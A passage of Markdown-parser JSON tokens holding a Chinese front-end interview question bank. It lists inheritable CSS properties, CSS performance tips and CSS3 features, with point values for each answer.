font-style、font-variant、font-weight、font-size、line-height、font-family","tokens":[{"type":"text","raw":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","text":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","escaped":false}]}]},{"type":"list_item","raw":"+ font-size\\n  font-size 用于设置文本的大小；常见值：\\n    length：如 12px、1em、0.75rem。\\n    percentage：相对于父元素的字体大小，如 150%。\\n    medium：默认字体大小。\\n    larger / smaller：相对于父元素字体大小的大小调整。\\n\\n","task":false,"loose":true,"text":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。\\n","tokens":[{"type":"text","raw":"font-size\\n\\nfont-size 用于设置文本的大小；常见值：\\n\\n  length：如 12px、1em、0.75rem。\\n\\n  percentage：相对于父元素的字体大小，如 150%。\\n\\n  medium：默认字体大小。\\n\\n  larger / smaller：相对于父元素字体大小的大小调整。\\n","text":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。","tokens":[{"type":"text","raw":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。","text":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。","escaped":false}]}]},{"type":"list_item","raw":"+ font-style\\n  font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n    normal：正常样式\\n    italic：斜体\\n    oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n","task":false,"loose":true,"text":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n","tokens":[{"type":"text","raw":"font-style\\n\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n\\n  normal：正常样式\\n\\n  italic：斜体\\n\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n","text":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形","tokens":[{"type":"text","raw":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形","text":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形","escaped":false}]}]},{"type":"list_item","raw":"+ font-variant\\n  font-variant 用于控制文本是否使用变体字体；常见值：\\n    normal：正常字体。\\n    small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n","task":false,"loose":true,"text":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n","tokens":[{"type":"text","raw":"font-variant\\n\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n\\n  normal：正常字体。\\n\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n","text":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。","tokens":[{"type":"text","raw":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。","text":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。","escaped":false}]}]},{"type":"list_item","raw":"+ font-weight\\n  font-weight 用于设置文本的粗细；常见值：\\n    normal：正常的字体粗细\\n    bold：加粗字体\\n    bolder：比父元素更粗\\n    lighter：比父元素更细\\n    number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n","task":false,"loose":true,"text":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n","tokens":[{"type":"text","raw":"font-weight\\n\\nfont-weight 用于设置文本的粗细；常见值：\\n\\n  normal：正常的字体粗细\\n\\n  bold：加粗字体\\n\\n  bolder：比父元素更粗\\n\\n  lighter：比父元素更细\\n\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n","text":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗","tokens":[{"type":"text","raw":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗","text":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗","escaped":false}]}]},{"type":"list_item","raw":"+ text-decoration\\n  text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n    none：无装饰\\n    underline：下划线\\n    overline：上划线\\n    line-through：删除线\\n    blink：闪烁的文本（大多数浏览器已不支持）\\n\\n","task":false,"loose":true,"text":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）\\n","tokens":[{"type":"text","raw":"text-decoration\\n\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n\\n  none：无装饰\\n\\n  underline：下划线\\n\\n  overline：上划线\\n\\n  line-through：删除线\\n\\n  blink：闪烁的文本（大多数浏览器已不支持）\\n","text":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）","tokens":[{"type":"text","raw":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）","text":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）","escaped":false}]}]},{"type":"list_item","raw":"+ text-transform\\n  text-transform 用于控制文本的大小写转换；常见值：\\n    none：不转换大小写\\n    capitalize：将每个单词的首字母转换为大写\\n    uppercase：将所有字母转换为大写\\n    lowercase：将所有字母转换为小写\\n\\n","task":false,"loose":true,"text":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写\\n","tokens":[{"type":"text","raw":"text-transform\\n\\ntext-transform 用于控制文本的大小写转换；常见值：\\n\\n  none：不转换大小写\\n\\n  capitalize：将每个单词的首字母转换为大写\\n\\n  uppercase：将所有字母转换为大写\\n\\n  lowercase：将所有字母转换为小写\\n","text":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写","tokens":[{"type":"text","raw":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写","text":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写","escaped":false}]}]},{"type":"list_item","raw":"+ direction\\n  direction 用于设置文本的书写方向；常见值：\\n    ltr：从左到右（默认）\\n    rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","task":false,"loose":true,"text":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","tokens":[{"type":"text","raw":"direction\\n\\ndirection 用于设置文本的书写方向；常见值：\\n\\n  ltr：从左到右（默认）\\n\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","text":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","tokens":[{"type":"text","raw":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","text":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 列表元素可继承的属性\\n  + list-style\\n    list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n      list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n      list-style-position：标记的位置，inside 或 outside。\\n      list-style-image：指定列表项标记为图片。\\n\\n  + list-style-type\\n    list-style-type 用于设置列表项的标记类型；常见值：\\n      disc：实心圆点（默认）\\n      circle：空心圆点\\n      square：方块\\n      decimal：数字列表（如 1, 2, 3）\\n      none：没有标记\\n\\n  + list-style-position\\n    list-style-position 用于设置列表标记的位置；常见值：\\n      outside：标记在列表项外部（默认）\\n      inside：标记在列表项内部\\n\\n  + list-style-image\\n    list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","task":false,"loose":true,"text":"**1：** 列表元素可继承的属性\\n+ list-style\\n  list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n    list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n    list-style-position：标记的位置，inside 或 outside。\\n    list-style-image：指定列表项标记为图片。\\n\\n+ list-style-type\\n  list-style-type 用于设置列表项的标记类型；常见值：\\n    disc：实心圆点（默认）\\n    circle：空心圆点\\n    square：方块\\n    decimal：数字列表（如 1, 2, 3）\\n    none：没有标记\\n\\n+ list-style-position\\n  list-style-position 用于设置列表标记的位置；常见值：\\n    outside：标记在列表项外部（默认）\\n    inside：标记在列表项内部\\n\\n+ list-style-image\\n  list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","tokens":[{"type":"text","raw":"**1：** 列表元素可继承的属性\\n","text":"**1：** 列表元素可继承的属性","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 列表元素可继承的属性","text":" 列表元素可继承的属性","escaped":false}]},{"type":"list","raw":"+ list-style\\n  list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n    list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n    list-style-position：标记的位置，inside 或 outside。\\n    list-style-image：指定列表项标记为图片。\\n\\n+ list-style-type\\n  list-style-type 用于设置列表项的标记类型；常见值：\\n    disc：实心圆点（默认）\\n    circle：空心圆点\\n    square：方块\\n    decimal：数字列表（如 1, 2, 3）\\n    none：没有标记\\n\\n+ list-style-position\\n  list-style-position 用于设置列表标记的位置；常见值：\\n    outside：标记在列表项外部（默认）\\n    inside：标记在列表项内部\\n\\n+ list-style-image\\n  list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ list-style\\n  list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n    list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n    list-style-position：标记的位置，inside 或 outside。\\n    list-style-image：指定列表项标记为图片。\\n\\n","task":false,"loose":true,"text":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。\\n","tokens":[{"type":"text","raw":"list-style\\n\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n\\n  list-style-position：标记的位置，inside 或 outside。\\n\\n  list-style-image：指定列表项标记为图片。\\n","text":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。","tokens":[{"type":"text","raw":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。","text":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。","escaped":false}]}]},{"type":"list_item","raw":"+ list-style-type\\n  list-style-type 用于设置列表项的标记类型；常见值：\\n    disc：实心圆点（默认）\\n    circle：空心圆点\\n    square：方块\\n    decimal：数字列表（如 1, 2, 3）\\n    none：没有标记\\n\\n","task":false,"loose":true,"text":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记\\n","tokens":[{"type":"text","raw":"list-style-type\\n\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n\\n  disc：实心圆点（默认）\\n\\n  circle：空心圆点\\n\\n  square：方块\\n\\n  decimal：数字列表（如 1, 2, 3）\\n\\n  none：没有标记\\n","text":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记","tokens":[{"type":"text","raw":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记","text":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记","escaped":false}]}]},{"type":"list_item","raw":"+ list-style-position\\n  list-style-position 用于设置列表标记的位置；常见值：\\n    outside：标记在列表项外部（默认）\\n    inside：标记在列表项内部\\n\\n","task":false,"loose":true,"text":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部\\n","tokens":[{"type":"text","raw":"list-style-position\\n\\nlist-style-position 用于设置列表标记的位置；常见值：\\n\\n  outside：标记在列表项外部（默认）\\n\\n  inside：标记在列表项内部\\n","text":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部","tokens":[{"type":"text","raw":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部","text":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部","escaped":false}]}]},{"type":"list_item","raw":"+ list-style-image\\n  list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","task":false,"loose":true,"text":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","tokens":[{"type":"text","raw":"list-style-image\\n\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","text":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","tokens":[{"type":"text","raw":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：","text":"list-style-image\\nlist-style-image 用于设置列表项标记为自定义图像；常见值：","escaped":false},{"type":"codespan","raw":"`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","text":"url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')"}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## CSS 性能优化\\n\\n","depth":2,"text":"CSS 性能优化","tokens":[{"type":"text","raw":"CSS 性能优化","text":"CSS 性能优化","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。\\n- **1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。\\n- **1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。\\n- **1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。\\n","task":false,"loose":false,"text":"**1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","tokens":[{"type":"text","raw":"**1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","text":"**1：** 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","text":" 合并与压缩 CSS 文件：减少文件体积，降低网络传输时间，如使用工具将多个 CSS 文件合并为一个并压缩代码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。\\n","task":false,"loose":false,"text":"**1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","tokens":[{"type":"text","raw":"**1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","text":"**1：** 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","text":" 合理使用选择器：避免复杂嵌套，保持选择器简单高效，如.parent >.child比.parent.class1.class2 >.child性能更好。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。\\n","task":false,"loose":false,"text":"**1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","tokens":[{"type":"text","raw":"**1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","text":"**1：** 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","text":" 优化图片资源：使用合适的图片格式与尺寸，对于小图标可考虑使用雪碧图或字体图标，减少 HTTP 请求。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","task":false,"loose":false,"text":"**1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","tokens":[{"type":"text","raw":"**1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","text":"**1：** 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","text":" 利用 CSS 继承：将可继承的属性设置在父元素，减少重复声明，如color、font - family等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSS3中有哪些新特性\\n\\n","depth":2,"text":"CSS3中有哪些新特性","tokens":[{"type":"text","raw":"CSS3中有哪些新特性","text":"CSS3中有哪些新特性","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n\\n- 圆角 （border-radius:8px）\\n\\n- 多列布局 （multi-column layout）\\n\\n- 阴影和反射 （box-shadow 和 reflect）\\n\\n- 文字特效 （text-shadow）\\n\\n- 线性渐变 （gradient）\\n\\n- 旋转 （transform）\\n\\n- 媒体查询 （@media）\\n\\n- 2D、3D 转换和动画","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n\\n","task":false,"loose":true,"text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n","tokens":[{"type":"text","raw":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）\\n","text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","tokens":[{"type":"text","raw":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","text":"新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点）","escaped":false}]}]},{"type":"list_item","raw":"- 圆角 （border-radius:8px）\\n\\n","task":false,"loose":true,"text":"圆角 （border-radius:8px）\\n","tokens":[{"type":"text","raw":"圆角 （border-radius:8px）\\n","text":"圆角 （border-radius:8px）","tokens":[{"type":"text","raw":"圆角 （border-radius:8px）","text":"圆角 （border-radius:8px）","escaped":false}]}]},{"type":"list_item","raw":"- 多列布局 （multi-column layout）\\n\\n","task":false,"loose":true,"text":"多列布局 （multi-column layout）\\n","tokens":[{"type":"text","raw":"多列布局 （multi-column layout）\\n","text":"多列布局 （multi-column layout）","tokens":[{"type":"text","raw":"多列布局 （multi-column layout）","text":"多列布局 （multi-column layout）","escaped":false}]}]},{"type":"list_item","raw":"- 阴影和反射 （box-shadow 和 reflect）\\n\\n","task":false,"loose":true,"text":"阴影和反射 （box-shadow 和 reflect）\\n","tokens":[{"type":"text","raw":"阴影和反射 （box-shadow 和 reflect）\\n","text":"阴影和反射 （box-shadow 和 reflect）","tokens":[{"type":"text","raw":"阴影和反射 （box-shadow 和 reflect）","text":"阴影和反射 （box-shadow 和 reflect）","escaped":false}]}]},{"type":"list_item","raw":"- 文字特效 （text-shadow）\\n\\n","task":false,"loose":true,"text":"文字特效 （text-shadow）\\n","tokens":[{"type":"text","raw":"文字特效 （text-shadow）\\n","text":"文字特效 （text-shadow）","tokens":[{"type":"text","raw":"文字特效 （text-shadow）","text":"文字特效 （text-shadow）","escaped":false}]}]},{"type":"list_item","raw":"- 线性渐变 （gradient）\\n\\n","task":false,"loose":true,"text":"线性渐变 （gradient）\\n","tokens":[{"type":"text","raw":"线性渐变 （gradient）\\n","text":"线性渐变 （gradient）","tokens":[{"type":"text","raw":"线性渐变 （gradient）","text":"线性渐变 （gradient）","escaped":false}]}]},{"type":"list_item","raw":"- 旋转 （transform）\\n\\n","task":false,"loose":true,"text":"旋转 （transform）\\n","tokens":[{"type":"text","raw":"旋转 （transform）\\n","text":"旋转 （transform）","tokens":[{"type":"text","raw":"旋转 （transform）","text":"旋转 （transform）","escaped":false}]}]},{"type":"list_item","raw":"- 媒体查询 （@media）\\n\\n","task":false,"loose":true,"text":"媒体查询 （@media）\\n","tokens":[{"type":"text","raw":"媒体查询 （@media）\\n","text":"媒体查询 （@media）","tokens":[{"type":"text","raw":"媒体查询 （@media）","text":"媒体查询 （@media）","escaped":false}]}]},{"type":"list_item","raw":"- 2D、3D 转换和动画","task":false,"loose":true,"text":"2D、3D 转换和动画","tokens":[{"type":"text","raw":"2D、3D 转换和动画","text":"2D、3D 转换和动画","tokens":[{"type":"text","raw":"2D、3D 转换和动画","text":"2D、3D 转换和动画","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 单行、多行文本溢出隐藏\\n\\n","depth":2,"text":"单行、多行文本溢出隐藏","tokens":[{"type":"text","raw":"单行、多行文本溢出隐藏","text":"单行、多行文本溢出隐藏","escaped":false}]},{"type":"heading","raw":"#### 